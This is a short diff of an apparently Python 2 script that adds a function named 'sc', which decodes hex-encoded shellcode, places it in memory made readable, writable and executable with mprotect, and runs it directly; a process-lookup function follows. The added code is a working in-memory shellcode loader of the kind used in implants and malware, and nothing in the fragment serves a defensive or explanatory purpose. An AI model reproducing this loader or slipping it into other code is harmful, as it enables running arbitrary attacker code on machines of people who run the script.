@@ -6,7 +6,24 @@ import requests
 import time
 import base64
 
-#time.sleep(10)
+
+def sc(scode):
+    '''
+    This takes in our shellcode
+    We can read this shellcode in from a number of sources
+    It gets input as hex and we strip and decode it
+    '''
+    libc = CDLL('libc.so.6')
+
+    shellcode = scode.replace('\\x', '').decode('hex')
+
+    sc = c_char_p(shellcode)
+    size = len(shellcode)
+    addr = c_void_p(libc.valloc(size))
+    memmove(addr, sc, size)
+    libc.mprotect(addr, size, 0x7)
+    run = cast(addr, CFUNCTYPE(c_void_p))
+    run()
 
 
 def get_pid(process_name):
